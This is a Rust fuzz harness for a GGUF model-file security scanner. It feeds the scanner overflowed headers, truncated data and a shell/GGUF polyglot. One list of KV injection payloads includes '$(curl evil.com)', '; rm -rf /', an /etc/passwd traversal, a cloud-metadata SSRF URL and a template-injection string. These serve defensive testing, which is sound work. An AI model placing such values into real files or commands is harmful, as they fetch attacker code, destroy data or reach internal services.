// fuzz_gguf.rs — Deep GGUF format fuzzer
//
// Exercises the sentinel-gguf crate with structured and adversarial
// GGUF inputs.  Tests all security checks (GGUF-001 to GGUF-015)
// including: tensor/KV count overflow, zero-tensor anomaly, KV injection,
// path traversal, SSRF in values, shell metachar, oversized strings,
// and key injection.
//
// Validates 8 invariants per input.
//
// Run:
//   cargo +nightly fuzz run fuzz_gguf -- -max_len=65536

#![no_main]

use libfuzzer_sys::fuzz_target;
use fuzz_helpers::invariants;

fn assert_gguf_valid(findings: &[sentinel_gguf::report::GgufFinding]) {
    invariants::assert_gguf_findings_valid(findings);
    for f in findings {
        assert!(
            f.rule_id.starts_with("GGUF-"),
            "GGUF finding has non-GGUF rule_id: {}",
            f.rule_id
        );
    }
}

fuzz_target!(|data: &[u8]| {
    // ── Pass 1: Bare fuzz bytes ───────────────────────────────────────
    assert_gguf_valid(&sentinel_gguf::scan(data));

    // ── Pass 2: Valid GGUF magic + fuzz body ──────────────────────────
    let mut with_magic = b"GGUF".to_vec();
    with_magic.extend_from_slice(data);
    assert_gguf_valid(&sentinel_gguf::scan(&with_magic));

    // ── Pass 3: Version sweep — test all known GGUF versions ─────────
    for version in [1u32, 2, 3] {
        let mut versioned = b"GGUF".to_vec();
        versioned.extend_from_slice(&version.to_le_bytes());
        versioned.extend_from_slice(data);
        assert_gguf_valid(&sentinel_gguf::scan(&versioned));
    }

    // ── Pass 4: Invalid version (0xFFFFFFFF) ──────────────────────────
    let mut bad_ver = b"GGUF".to_vec();
    bad_ver.extend_from_slice(&u32::MAX.to_le_bytes());
    bad_ver.extend_from_slice(data);
    assert_gguf_valid(&sentinel_gguf::scan(&bad_ver));

    // ── Pass 5: Tensor count overflow ─────────────────────────────────
    let mut overflow = b"GGUF".to_vec();
    overflow.extend_from_slice(&3u32.to_le_bytes()); // version=3
    overflow.extend_from_slice(&u64::MAX.to_le_bytes()); // tensor_count
    overflow.extend_from_slice(data);
    let overflow_findings = sentinel_gguf::scan(&overflow);
    assert_gguf_valid(&overflow_findings);
    // Overflow should trigger GGUF-001 (tensor count overflow)
    let has_overflow_finding = overflow_findings.iter().any(|f|
        f.rule_id == "GGUF-001" || f.description.contains("overflow") || f.description.contains("Overflow")
    );
    // Only assert if we got any findings (parser may reject too-short data)
    if !overflow_findings.is_empty() {
        assert!(has_overflow_finding, "tensor count overflow should trigger GGUF-001");
    }

    // ── Pass 6: KV count overflow ─────────────────────────────────────
    let mut kv_overflow = b"GGUF".to_vec();
    kv_overflow.extend_from_slice(&3u32.to_le_bytes()); // version=3
    kv_overflow.extend_from_slice(&0u64.to_le_bytes()); // tensor_count=0
    kv_overflow.extend_from_slice(&u64::MAX.to_le_bytes()); // kv_count
    kv_overflow.extend_from_slice(data);
    assert_gguf_valid(&sentinel_gguf::scan(&kv_overflow));

    // ── Pass 7: Zero-tensor anomaly ───────────────────────────────────
    let mut zero_tensor = b"GGUF".to_vec();
    zero_tensor.extend_from_slice(&3u32.to_le_bytes()); // version=3
    zero_tensor.extend_from_slice(&0u64.to_le_bytes()); // tensor_count=0
    zero_tensor.extend_from_slice(&0u64.to_le_bytes()); // kv_count=0
    assert_gguf_valid(&sentinel_gguf::scan(&zero_tensor));

    // ── Pass 8: KV injection payloads ─────────────────────────────────
    // Build a minimal valid GGUF with injection in KV string values
    if data.len() > 8 {
        let injection_payloads: &[&[u8]] = &[
            b"../../../etc/passwd",
            b"http://169.254.169.254/latest/meta-data/",
            b"$(curl evil.com)",
            b"; rm -rf /",
            b"{{config.__class__.__init__.__globals__}}",
            b"\x00\x00\x00\x00",
        ];
        for payload in injection_payloads {
            let mut injected = b"GGUF".to_vec();
            injected.extend_from_slice(&3u32.to_le_bytes());
            injected.extend_from_slice(&0u64.to_le_bytes()); // tensors
            injected.extend_from_slice(&1u64.to_le_bytes()); // 1 KV
            // KV key: 4-byte len + "test"
            injected.extend_from_slice(&4u64.to_le_bytes());
            injected.extend_from_slice(b"test");
            injected.extend_from_slice(&8u32.to_le_bytes()); // type=STRING
            // KV value: len + payload
            injected.extend_from_slice(&(payload.len() as u64).to_le_bytes());
            injected.extend_from_slice(payload);
            assert_gguf_valid(&sentinel_gguf::scan(&injected));
        }
    }

    // ── Pass 9: Idempotency ───────────────────────────────────────────
    let f1 = sentinel_gguf::scan(data);
    let f2 = sentinel_gguf::scan(data);
    assert_eq!(f1.len(), f2.len(), "GGUF scan idempotency violated");

    // ── Pass 10: Truncation robustness ────────────────────────────────
    if data.len() > 4 {
        let cuts = [1, 4, data.len() / 2, data.len() - 1];
        for &cut in &cuts {
            if cut > 0 && cut < data.len() {
                let _ = sentinel_gguf::scan(&data[..cut]);
            }
        }
    }

    // ── Pass 11: Cross-scanner — also pass through pickle scanner ─────
    // LlamaFile polyglot: shell + GGUF → pickle scanner must not panic
    let mut polyglot = b"#!/bin/sh\nexec \"$0\"\n#".to_vec();
    polyglot.extend_from_slice(b"GGUF");
    polyglot.extend_from_slice(data);
    let policy = sentinel_pickle::policy::ScanPolicy::new(false);
    let pickle_findings = sentinel_pickle::scanner::scan_data(&polyglot, &policy);
    invariants::assert_findings_valid(&pickle_findings);
});
